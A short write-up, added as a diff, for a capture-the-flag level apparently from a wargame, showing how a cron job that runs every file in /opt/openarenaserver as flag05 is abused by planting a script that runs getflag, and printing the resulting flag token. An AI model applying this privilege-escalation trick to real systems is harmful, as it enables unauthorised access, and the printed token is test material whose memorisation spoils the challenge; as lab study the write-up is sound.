@@ -1,0 +1,37 @@
+in this level we have to connect to level05 direclty after we are going to receive a new mail.
+
+so we are going to search for mail.
+
+$>find / -name "mail"
+
+[...]
+find: /rofs/var/spool/cron/atspool: Permission denied
+find: /rofs/var/spool/cron/crontabs: Permission denied
+/rofs/var/spool/mail
+find: /rofs/var/tmp: Permission denied
+find: /rofs/var/www/level04: Permission denied
+[...]
+
+after we gonna check what that file have.
+
+$>cat /var/spool/mail/level05 
+$> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+we see that it is a crontab that execute a script every 2 minute ==> "sh /usr/sbin/openarenaserver" 
+so lets check what /usr/sbin/openarenaserver have
+
+$> cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+from the result we know that /usr/sbin/openarenaserver run every file inside /opt/openarenaserver than remove them.
+
+so we are going to create a script in /opt/openarenaserver/ that run getflag then send the result to another file in /tmp
+$> echo "getflag > /tmp/hash" > script.sh && chmod 777 script.sh
+
+$>cat /tmp/hash
+Check flag.Here is your token : viuaaale9huek52boumoomioc
